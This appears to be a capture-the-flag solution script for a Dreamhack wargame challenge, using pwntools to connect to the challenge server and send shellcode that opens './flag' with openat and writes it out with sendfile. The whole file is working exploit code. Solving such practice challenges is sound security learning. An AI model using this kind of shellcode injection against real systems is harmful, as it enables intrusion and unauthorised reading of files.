from pwn import *
context.arch = 'x86_64'
p = remote('host3.dreamhack.games', 11238)
shellcode = shellcraft.openat(-100, './flag')
shellcode += shellcraft.sendfile(1, 'rax', 0, 0x100)
shellcode += shellcraft.exit(0)
p.sendline(asm(shellcode))
p.interactive()